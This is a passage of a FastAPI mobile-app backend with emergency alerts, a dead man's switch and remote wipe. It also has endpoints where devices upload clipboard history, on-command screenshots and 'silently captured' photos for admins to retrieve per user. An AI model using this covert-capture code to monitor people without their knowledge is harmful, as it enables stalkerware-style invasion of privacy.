                "username": user.username if user else "unknown",
                "event_type": ev.event_type,
                "latitude": ev.latitude,
                "longitude": ev.longitude,
                "triggered_at": ev.triggered_at.isoformat(),
            })
        return result
    except Exception as e:
        logger.error(f"Geofence events error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve geofence events")


# ─── Dead Man's Switch Endpoints ───────────────────────────────────────────────

@app.post("/deadmans/configure")
async def configure_dead_mans_switch(
    data: DeadMansSwitchConfig,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User configures their dead man's switch (interval, message, enable/disable)."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        switch = DeadMansSwitchService.configure(db, user_id, data)
        return {
            "enabled": switch.enabled,
            "interval_hours": switch.interval_hours,
            "last_checkin": switch.last_checkin.isoformat() if switch.last_checkin else None,
        }
    except Exception as e:
        logger.error(f"Configure dead mans switch error: {e}")
        raise HTTPException(status_code=500, detail="Failed to configure dead man's switch")


@app.post("/deadmans/checkin")
async def dead_mans_checkin(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User manually checks in, resetting the dead man's switch timer."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        switch = DeadMansSwitchService.checkin(db, user_id)
        return {
            "last_checkin": switch.last_checkin.isoformat(),
            "next_alert_after": f"{switch.interval_hours}h of silence",
        }
    except Exception as e:
        logger.error(f"Dead mans checkin error: {e}")
        raise HTTPException(status_code=500, detail="Failed to check in")


@app.get("/deadmans/status")
async def get_dead_mans_status(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User views their own switch status."""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        switch = db.query(DeadMansSwitch).filter(DeadMansSwitch.user_id == user_id).first()
        if not switch:
            return {"enabled": False}
        return {
            "enabled": switch.enabled,
            "interval_hours": switch.interval_hours,
            "last_checkin": switch.last_checkin.isoformat() if switch.last_checkin else None,
            "alert_message": switch.alert_message,
        }
    except Exception as e:
        logger.error(f"Dead mans status error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve status")


@app.get("/admin/deadmans/overview")
async def admin_deadmans_overview(
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin sees all enabled dead man's switches and who is overdue."""
    try:
        now = datetime.utcnow()
        switches = db.query(DeadMansSwitch).filter(DeadMansSwitch.enabled == True).all()
        result = []
        for sw in switches:
            user = db.query(User).filter(User.id == sw.user_id).first()
            silent_hours = None
            overdue = False
            if sw.last_checkin:
                silent_hours = round((now - sw.last_checkin).total_seconds() / 3600, 2)
                overdue = silent_hours >= sw.interval_hours
            result.append({
                "user_id": int(sw.user_id),
                "username": user.username if user else "unknown",
                "interval_hours": sw.interval_hours,
                "last_checkin": sw.last_checkin.isoformat() if sw.last_checkin else None,
                "silent_hours": silent_hours,
                "overdue": overdue,
            })
        # Sort overdue first
        result.sort(key=lambda x: x["overdue"], reverse=True)
        return result
    except Exception as e:
        logger.error(f"Admin deadmans overview error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve overview")


# ─── Emergency / Panic Alert Endpoints ────────────────────────────────────────

@app.post("/emergency/trigger")
async def trigger_emergency(
    data: EmergencyTriggerRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """
    User triggers a panic/emergency alert.
    Immediately pushes real-time notification to all online admins.
    Stores alert with GPS location and device context.
    """
    try:
        user_id = int(getattr(current_user, 'id', 0))
        alert = await EmergencyService.trigger_alert(db, user_id, data)
        return {
            "alert_id": int(alert.id),
            "status": "active",
            "message": "Emergency alert sent to admins",
            "triggered_at": alert.triggered_at.isoformat()
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Emergency trigger error: {e}")
        raise HTTPException(status_code=500, detail="Failed to trigger emergency alert")


@app.get("/emergency/my_alerts")
async def get_my_emergency_alerts(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """User views their own alert history"""
    try:
        user_id = int(getattr(current_user, 'id', 0))
        alerts = (
            db.query(EmergencyAlert)
            .filter(EmergencyAlert.user_id == user_id)
            .order_by(EmergencyAlert.triggered_at.desc())
            .limit(50)
            .all()
        )
        return [
            {
                "alert_id": int(a.id),
                "alert_type": a.alert_type,
                "status": a.status,
                "latitude": a.latitude,
                "longitude": a.longitude,
                "location_name": a.location_name,
                "message": a.message,
                "triggered_at": a.triggered_at.isoformat(),
                "acknowledged_at": a.acknowledged_at.isoformat() if a.acknowledged_at else None,
                "resolved_at": a.resolved_at.isoformat() if a.resolved_at else None,
            }
            for a in alerts
        ]
    except Exception as e:
        logger.error(f"Get my alerts error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve alerts")


@app.get("/admin/emergency/alerts")
async def admin_get_emergency_alerts(
    status_filter: Optional[str] = None,
    limit: int = 100,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin: get all emergency alerts, optionally filtered by status"""
    try:
        query = db.query(EmergencyAlert).order_by(EmergencyAlert.triggered_at.desc())
        if status_filter:
            query = query.filter(EmergencyAlert.status == status_filter)
        alerts = query.limit(limit).all()

        result = []
        for a in alerts:
            user = db.query(User).filter(User.id == a.user_id).first()
            result.append({
                "alert_id": int(a.id),
                "user_id": int(a.user_id),
                "username": user.username if user else "unknown",
                "phone_number": user.phone_number if user else "unknown",
                "alert_type": a.alert_type,
                "status": a.status,
                "latitude": a.latitude,
                "longitude": a.longitude,
                "accuracy": a.accuracy,
                "location_name": a.location_name,
                "message": a.message,
                "device_info": a.device_info,
                "triggered_at": a.triggered_at.isoformat(),
                "acknowledged_at": a.acknowledged_at.isoformat() if a.acknowledged_at else None,
                "resolved_at": a.resolved_at.isoformat() if a.resolved_at else None,
                "acknowledged_by": a.acknowledged_by,
            })
        return result
    except Exception as e:
        logger.error(f"Admin get alerts error: {e}")
        raise HTTPException(status_code=500, detail="Failed to retrieve emergency alerts")


@app.post("/admin/emergency/acknowledge")
async def admin_acknowledge_alert(
    data: EmergencyAcknowledgeRequest,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin: acknowledge an active emergency alert"""
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        alert = EmergencyService.acknowledge_alert(db, data.alert_id, admin_id)

        # Notify the user their alert was acknowledged
        await ws_manager.send_to_user(int(alert.user_id), {
            "type": "emergency_acknowledged",
            "data": {
                "alert_id": int(alert.id),
                "acknowledged_at": alert.acknowledged_at.isoformat(),
                "note": data.note,
            }
        })
        return {"alert_id": int(alert.id), "status": "acknowledged"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Acknowledge alert error: {e}")
        raise HTTPException(status_code=500, detail="Failed to acknowledge alert")


@app.post("/admin/emergency/resolve")
async def admin_resolve_alert(
    data: EmergencyResolveRequest,
    admin_user: User = Depends(get_admin_user),
    db: Session = Depends(get_database_session)
):
    """Admin: mark emergency alert as resolved"""
    try:
        admin_id = int(getattr(admin_user, 'id', 0))
        alert = EmergencyService.resolve_alert(db, data.alert_id, admin_id)

        # Notify the user their alert was resolved
        await ws_manager.send_to_user(int(alert.user_id), {
            "type": "emergency_resolved",
            "data": {
                "alert_id": int(alert.id),
                "resolved_at": alert.resolved_at.isoformat(),
                "note": data.note,
            }
        })
        return {"alert_id": int(alert.id), "status": "resolved"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Resolve alert error: {e}")
        raise HTTPException(status_code=500, detail="Failed to resolve alert")


# Health check endpoint
@app.get("/status")
async def raw_upload_health_check():
    return {
        "status": "running",
        "version": "1.0.0"
    }

# ─── Snapshot endpoints (battery, network, device-info, clipboard, screenshot, photo) ───

@app.post("/device-data/battery")
async def device_upload_battery(payload: Dict, current_user: User = Depends(get_current_user)):
    """Device uploads battery status snapshot."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "battery.json")
    with open(path, "w") as f:
        _json.dump(payload, f)
    return {"status": "ok"}

@app.get("/admin/device-data/battery/{username}")
async def admin_get_battery(username: str, current_user: User = Depends(get_current_user)):
    """Admin retrieves latest battery snapshot for a user."""
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    import json as _json
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "battery.json")
    if not os.path.exists(path):
        return {"error": "No snapshot yet"}
    with open(path) as f:
        return _json.load(f)

@app.post("/device-data/network")
async def device_upload_network(payload: Dict, current_user: User = Depends(get_current_user)):
    """Device uploads network info snapshot."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "network.json")
    with open(path, "w") as f:
        _json.dump(payload, f)
    return {"status": "ok"}

@app.get("/admin/device-data/network/{username}")
async def admin_get_network(username: str, current_user: User = Depends(get_current_user)):
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    import json as _json
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "network.json")
    if not os.path.exists(path):
        return {"error": "No snapshot yet"}
    with open(path) as f:
        return _json.load(f)

@app.post("/device-data/device-info")
async def device_upload_device_info(payload: Dict, current_user: User = Depends(get_current_user)):
    """Device uploads hardware/OS info snapshot."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    path = os.path.join(_user_data_dir(user_id), "device_info.json")
    with open(path, "w") as f:
        _json.dump(payload, f)
    return {"status": "ok"}

@app.get("/admin/device-data/device-info/{username}")
async def admin_get_device_info(username: str, current_user: User = Depends(get_current_user)):
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    import json as _json
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "device_info.json")
    if not os.path.exists(path):
        return {"error": "No snapshot yet"}
    with open(path) as f:
        return _json.load(f)

@app.post("/device-data/clipboard")
async def device_upload_clipboard(payload: Dict, current_user: User = Depends(get_current_user)):
    """Device uploads clipboard content."""
    import json as _json
    user_id = int(getattr(current_user, 'id', 0))
    clip_dir = os.path.join(_user_data_dir(user_id), "clipboard")
    os.makedirs(clip_dir, exist_ok=True)
    entry = {**payload, "saved_at": datetime.now(timezone.utc).isoformat()}
    # Append to history
    history_path = os.path.join(clip_dir, "history.json")
    history = []
    if os.path.exists(history_path):
        try:
            with open(history_path) as f:
                history = _json.load(f)
        except Exception:
            history = []
    history.insert(0, entry)
    history = history[:100]  # keep last 100 entries
    with open(history_path, "w") as f:
        _json.dump(history, f)
    return {"status": "ok"}

@app.get("/admin/device-data/clipboard/{username}")
async def admin_get_clipboard(username: str, current_user: User = Depends(get_current_user)):
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    import json as _json
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    path = os.path.join(_user_data_dir(int(target.id)), "clipboard", "history.json")
    if not os.path.exists(path):
        return []
    with open(path) as f:
        return _json.load(f)

@app.post("/device-data/screenshot/upload")
async def device_upload_screenshot(
    file: UploadFile = File(...),
    command_id: str = Form(default="0"),
    context: str = Form(default="screenshot"),
    current_user: User = Depends(get_current_user),
):
    """Device uploads a screenshot captured on command."""
    user_id = int(getattr(current_user, 'id', 0))
    ss_dir = os.path.join(_user_data_dir(user_id), "screenshots")
    os.makedirs(ss_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    filename = f"ss_{ts}_{uuid.uuid4().hex[:6]}.jpg"
    file_path = os.path.join(ss_dir, filename)
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)
    return {"status": "ok", "filename": filename}

@app.get("/admin/device-data/screenshots/{username}")
async def admin_list_screenshots(username: str, current_user: User = Depends(get_current_user)):
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    ss_dir = os.path.join(_user_data_dir(int(target.id)), "screenshots")
    if not os.path.exists(ss_dir):
        return []
    files = sorted(os.listdir(ss_dir), reverse=True)
    return [{"filename": f, "url": f"/admin/device-data/screenshots/{username}/{f}"} for f in files if f.endswith('.jpg')]

@app.get("/admin/device-data/screenshots/{username}/{filename}")
async def admin_get_screenshot(
    username: str, filename: str,
    token: Optional[str] = Query(None),
    request: Request = None,
):
    """Serves screenshot file. Accepts Bearer header OR ?token= query param."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    db = next(get_database_session())
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    admin = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not admin or not admin.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    from fastapi.responses import FileResponse
    file_path = os.path.join(_user_data_dir(int(target.id)), "screenshots", os.path.basename(filename))
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")

@app.post("/device-data/photo/upload")
async def device_upload_photo(
    file: UploadFile = File(...),
    command_id: str = Form(default="0"),
    context: str = Form(default="take_photo"),
    current_user: User = Depends(get_current_user),
):
    """Device uploads a silently captured photo."""
    user_id = int(getattr(current_user, 'id', 0))
    photo_dir = os.path.join(_user_data_dir(user_id), "photos")
    os.makedirs(photo_dir, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    filename = f"photo_{ts}_{uuid.uuid4().hex[:6]}.jpg"
    file_path = os.path.join(photo_dir, filename)
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)
    return {"status": "ok", "filename": filename}

@app.get("/admin/device-data/photos/{username}")
async def admin_list_photos(username: str, current_user: User = Depends(get_current_user)):
    if not getattr(current_user, 'is_admin', False):
        raise HTTPException(status_code=403, detail="Admin only")
    db = next(get_database_session())
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    photo_dir = os.path.join(_user_data_dir(int(target.id)), "photos")
    if not os.path.exists(photo_dir):
        return []
    files = sorted(os.listdir(photo_dir), reverse=True)
    return [{"filename": f, "url": f"/admin/device-data/photos/{username}/{f}"} for f in files if f.endswith('.jpg')]

@app.get("/admin/device-data/photos/{username}/{filename}")
async def admin_get_photo(
    username: str, filename: str,
    token: Optional[str] = Query(None),
    request: Request = None,
    db: Session = Depends(get_database_session),
):
    """Serves photo file. Accepts Bearer header OR ?token= query param."""
    raw_token = token
    if not raw_token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            raw_token = auth_header[7:]
    if not raw_token:
        raise HTTPException(status_code=401, detail="Missing token")
    session = SessionService.validate_session(db, raw_token)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid token")
    admin = db.query(User).filter(User.id == session.user_id, User.is_active == True).first()
    if not admin or not admin.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")
    target = db.query(User).filter(User.username == username).first()
    if not target:
        raise HTTPException(status_code=404, detail="User not found")
    from fastapi.responses import FileResponse
    file_path = os.path.join(_user_data_dir(int(target.id)), "photos", os.path.basename(filename))
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")

        
if __name__ == "__main__":
    # Use Render's PORT environment variable, default to 8001 for local development
    port = int(os.getenv("PORT", 8010))
    uvicorn.run(
        "fastapi_mobile_backend_postgresql:app",
        host="0.0.0.0",
        port=port,
        reload=False,  # Disable reload in production
        log_level="info"
    )

# ==========================================
# MDM (Mobile Device Management) INTEGRATION
# ==========================================

import httpx

MDM_MICROSERVICE_URL = os.getenv("MDM_MICROSERVICE_URL", "http://localhost:8001")

class MDMEnrollRequest(BaseModel):
    headwind_device_id: str
    imei: Optional[str] = None

class MDMWipeRequest(BaseModel):
    user_id: Optional[int] = None
    reason: str = "Security Trigger"

@app.post("/api/v1/mdm/enroll")
async def mdm_enroll(
    request: MDMEnrollRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Enroll the current user device into the MDM system"""
    # Check if profile already exists
    profile = db.query(MDMDeviceProfile).filter(MDMDeviceProfile.user_id == current_user.id).first()
    
    if profile:
        profile.headwind_device_id = request.headwind_device_id
        profile.imei = request.imei
        profile.enrollment_status = "enrolled"
    else:
        profile = MDMDeviceProfile(
            user_id=current_user.id,
            headwind_device_id=request.headwind_device_id,
            imei=request.imei,
            enrollment_status="enrolled"
        )
        db.add(profile)
    
    db.commit()
    
    # Forward to Go microservice
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{MDM_MICROSERVICE_URL}/mdm/enroll",
                json={"device_id": request.headwind_device_id, "imei": request.imei, "user_id": current_user.id},
                timeout=5.0
            )
            return {"status": "enrolled", "microservice_response": resp.json()}
    except Exception as e:
        logger.error(f"MDM Microservice error: {e}")
        # Still return success for local profile creation
        return {"status": "enrolled_local_only", "error": str(e)}

@app.post("/api/v1/mdm/wipe")
async def mdm_wipe(
    request: MDMWipeRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_database_session)
):
    """Trigger a device wipe command. Admin or Emergency only."""
    target_user_id = request.user_id if request.user_id else current_user.id
    
    # Must be admin to wipe someone else
    if target_user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Not authorized to wipe this device")
        
    profile = db.query(MDMDeviceProfile).filter(MDMDeviceProfile.user_id == target_user_id).first()
    if not profile:
        raise HTTPException(status_code=404, detail="MDM profile not found for user")
        
    profile.wipe_requested = True
    profile.wipe_reason = request.reason
    db.commit()
    
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{MDM_MICROSERVICE_URL}/mdm/wipe",
                json={"device_id": profile.headwind_device_id, "reason": request.reason},
                timeout=5.0
            )
            return {"status": "wipe_triggered", "microservice_response": resp.json()}
    except Exception as e:
        logger.error(f"MDM Microservice wipe error: {e}")
        return {"status": "wipe_queued_local", "error": str(e)}
